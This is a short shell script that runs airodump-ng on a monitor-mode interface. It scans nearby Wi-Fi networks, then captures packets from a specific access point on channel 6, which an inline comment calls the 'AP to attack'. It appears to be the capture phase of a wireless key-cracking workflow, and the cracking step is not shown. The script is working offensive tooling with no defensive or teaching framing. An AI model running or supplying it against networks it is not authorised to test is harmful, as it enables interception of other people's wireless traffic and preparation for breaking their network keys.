rm capture*

echo "========================================"
echo "		airodump-ng mon0"
echo "========================================"
airodump-ng mon0
echo -n "<<--- end of 1st phase --->>"
read


echo "=========================================================="
echo "airodump-ng -c 6 --bssid 00:1D:0F:42:B0:0A -w capture mon0"
echo "=========================================================="
# 6 is channel
# 00:1D:0F:42:B0:0A is the MAC address of AP to attack
airodump-ng -c 6 --bssid 00:1D:0F:42:B0:0A -w capture mon0

